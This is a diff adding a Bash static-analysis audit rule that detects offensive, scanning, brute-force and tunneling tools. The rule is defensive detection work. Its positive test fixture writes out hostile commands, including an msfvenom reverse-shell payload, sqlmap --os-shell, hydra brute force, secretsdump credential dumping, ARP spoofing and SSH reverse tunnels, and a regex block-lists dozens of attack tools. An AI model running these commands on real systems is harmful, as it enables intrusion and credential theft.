@@ -1,0 +1,77 @@
+desc(
+	mode: "ssa"
+	language: "bash"
+	title: "Bash: offensive security tooling or tunneling"
+	title_zh: "Bash：使用攻击工具或建立隧道"
+	type: audit
+	level: "middle"
+	rule_id: "bash-offensive-tooling"
+	risk: "audit-check"
+	desc: <<<DESC
+### 说明
+脚本调用了常见的攻击、扫描、爆破或隧道工具：`nmap`、`masscan`、
+`gobuster`、`ffuf`、`nuclei`、`sqlmap`、`hydra`、`msfvenom`、
+`responder`、`bettercap`、`chisel`、`sshuttle`、`proxychains`、
+`netexec`、`evil-winrm`、`secretsdump` 等，或通过 `ssh -R/-D` 建立
+反向/动态端口转发。这类命令在攻防和 CTF 中常用于侦察、横向和驻留。
+DESC
+	solution: <<<SOLUTION
+### 修复建议
+确认脚本来源和用途；生产主机不应出现攻击工具。限制出站连接和 SSH
+端口转发，监控异常扫描流量与隧道连接。
+SOLUTION
+	reference: <<<REFERENCE
+[CWE-200](https://cwe.mitre.org/data/definitions/200.html)
+REFERENCE
+	alert_min: 1
+	"file://pos.sh": <<<POS
+nmap -sS -Pn 10.0.0.0/24
+masscan 10.0.0.0/8 -p1-65535 --rate 10000
+gobuster dir -u https://target.example -w common.txt
+ffuf -u https://target.example/FUZZ -w words.txt
+nuclei -u https://target.example -tags cve
+sqlmap -u "https://target.example/?id=1" --os-shell
+hydra -l root -P pass.txt ssh://10.0.0.1
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/x
+msfconsole -q -x "use exploit/multi/handler; run"
+responder -I eth0 -wrv
+bettercap -iface eth0 -eval "net.sniff on"
+arpspoof -i eth0 -t 10.0.0.2 10.0.0.1
+chisel client https://10.0.0.1:8080 8080:127.0.0.1:80
+sshuttle -r user@10.0.0.1 0.0.0.0/0
+proxychains4 nmap -sT 10.0.0.0/24
+netexec smb 10.0.0.0/24 -u user -p pass
+evil-winrm -i 10.0.0.1 -u admin -p pass
+secretsdump.py domain/user:pass@10.0.0.1
+ssh -R 8080:localhost:80 user@10.0.0.1
+ssh -D 1080 user@10.0.0.1
+POS
+	"safefile://neg.sh": <<<NEG
+ssh user@example.com
+curl -fsSL https://example.com/x.sh -o /tmp/x.sh
+git clone https://example.com/repo.git
+docker run alpine echo hi
+ping -c 1 example.com
+NEG
+)
+
+/^(nmap|masscan|nikto|gobuster|ffuf|feroxbuster|dirb|dirsearch|wfuzz|nuclei|sqlmap|wpscan|whatweb|wafw00f|theHarvester|amass|subfinder|assetfinder|httpx|naabu|dnsx|katana|gau|waybackurls|dalfox|xsstrike|commix|tplmap|hydra|medusa|patator|crowbar|msfvenom|msfconsole|searchsploit|responder|bettercap|ettercap|arpspoof|dnsspoof|hping3|slowloris|chisel|ligolo|ligolo-proxy|frp|sshuttle|proxychains|proxychains4|crackmapexec|netexec|nxc|evil-winrm|enum4linux|enum4linux-ng|rpcclient|smbmap|smbclient|bloodhound-python|kerbrute|secretsdump|psexec|wmiexec|smbexec|atexec|ntlmrelayx|getnpusers|getuserspns)(\.py)?$/ as $toolHit
+
+ssh(* as $sshArgs) as $sshCall
+$sshCall?{any: /-R/, /-D/} as $sshTunnelHit
+
+alert $toolHit for {
+	level: "middle",
+	title: "Bash: offensive security tooling or tunneling",
+	title_zh: "Bash：使用攻击工具或建立隧道",
+	message: "检测到攻击/扫描/爆破/隧道工具调用。",
+	risk: "audit-check",
+}
+
+alert $sshTunnelHit for {
+	level: "middle",
+	title: "Bash: offensive security tooling or tunneling",
+	title_zh: "Bash：使用攻击工具或建立隧道",
+	message: "检测到 ssh 反向端口转发或动态 socks 代理。",
+	risk: "audit-check",
+}
